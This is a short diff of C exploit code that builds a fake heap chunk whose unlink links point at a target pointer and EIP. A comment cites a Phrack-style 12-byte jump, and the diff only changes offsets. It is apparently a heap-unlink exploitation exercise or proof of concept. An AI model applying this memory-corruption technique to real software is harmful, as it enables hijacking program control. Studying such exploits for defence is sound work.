@@ -63,10 +63,10 @@ int main(void)
   void *vp = (void*)buf + (QPOINTER - PPOINTER);
   CHUNK *p = TOCHUNK(vp);
 
-  p->s.l = (void*)QPOINTER+0x100; 
+  p->s.l = (void*)QPOINTER; 
   p->s.r = (void*)EIP;
 
-  CHUNK *l = TOCHUNK(vp+sizeof(CHUNK)+0x100);
+  CHUNK *l = TOCHUNK(vp+sizeof(CHUNK));
   CHUNK *r = TOCHUNK(vp-sizeof(CHUNK));
 
   // Do a jmp for 12 bytes as the phrack suggested
